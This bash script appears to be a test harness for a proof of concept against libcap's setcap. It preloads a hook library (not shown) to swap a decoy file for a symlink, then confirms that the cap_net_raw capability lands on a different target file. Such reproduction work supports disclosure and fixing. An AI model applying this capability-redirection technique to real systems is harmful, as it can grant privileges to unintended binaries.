#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")/.." && pwd)"

if [[ "$(id -u)" -ne 0 ]]; then
  echo "validate_setcap_tool.sh requires root or CAP_SETFCAP" >&2
  exit 1
fi

if ! command -v setcap >/dev/null 2>&1; then
  echo "setcap is not installed; install libcap2-bin first" >&2
  exit 1
fi

make -C "$ROOT_DIR" build/libcap_swap_hook.so

TMP_DIR="$(mktemp -d /tmp/libcap-setcap-poc-XXXXXX)"
trap 'rm -rf "$TMP_DIR"' EXIT

DECOY="$TMP_DIR/decoy"
TARGET="$TMP_DIR/target"
SWAP="$TMP_DIR/swap"

touch "$DECOY" "$TARGET"
chmod 0755 "$DECOY" "$TARGET"
ln -s "$TARGET" "$SWAP"

if command -v dpkg-query >/dev/null 2>&1; then
  echo "[setcap] package $(dpkg-query -W -f='${Version}' libcap2-bin 2>/dev/null || echo unknown)"
fi

if getcap "$TARGET" | grep -q .; then
  echo "[setcap] target unexpectedly has capabilities before the test" >&2
  exit 1
fi

LIBCAP_POC_DECOY="$DECOY" \
LIBCAP_POC_SWAP="$SWAP" \
LD_PRELOAD="$ROOT_DIR/build/libcap_swap_hook.so" \
  setcap cap_net_raw=ep "$DECOY"

RESULT="$(getcap "$TARGET" || true)"
if [[ "$RESULT" != *"cap_net_raw=ep"* ]]; then
  echo "[setcap] expected target to receive cap_net_raw=ep, got: ${RESULT:-<none>}" >&2
  exit 1
fi

echo "[setcap] bug confirmed: capability injection landed on target"
echo "[setcap] $RESULT"
